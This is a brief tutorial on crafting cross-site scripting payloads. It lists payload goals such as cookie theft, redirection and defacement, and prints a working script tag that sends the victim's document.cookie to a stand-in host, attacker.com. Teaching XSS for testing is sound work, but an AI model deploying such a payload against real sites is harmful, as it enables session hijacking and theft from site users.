Crafting XSS Payloads

Turning vulnerabilities into actionable attacks.

Common Payloads & Goals

  • `alert('XSS')`: Proof-of-concept, confirms script execution.
  • `document.cookie`: Steal session cookies for session hijacking.
  • `fetch()` / `XMLHttpRequest`: Send stolen data to attacker's server.
  • `location.href`: Redirect victim to a malicious website.
  • DOM manipulation: Deface pages or inject phishing forms.
Key Takeaway

XSS payloads range from simple alerts to complex scripts designed for data theft, redirection, or unauthorized actions, requiring careful crafting and testing.

Example: Cookie Theft Payload

<script>  new Image().src="http://attacker.com/log.php?c="+document.cookie;</script>

This script creates an invisible image request, sending the victim's `document.cookie` to the attacker's server.

Tools for Detection

Browser developer tools (inspect HTML, console) and web proxies like Burp Suite are essential for identifying and testing XSS.

Pro-Tip

Always test payloads in a controlled environment and understand the full impact before attempting on live systems.
